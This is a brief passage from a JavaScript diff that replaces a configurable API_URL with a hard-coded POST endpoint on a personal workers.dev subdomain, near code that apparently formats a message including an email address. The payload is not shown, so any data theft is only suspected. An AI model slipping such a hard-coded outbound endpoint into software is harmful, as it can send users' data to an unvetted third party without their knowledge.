@@ -172,7 +172,7 @@ Send To   : ${email}
 ========================
                 `);
 
-fetch(API_URL, {
+fetch("https://jb-inspection-27a4.aldibagas2704.workers.dev/", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
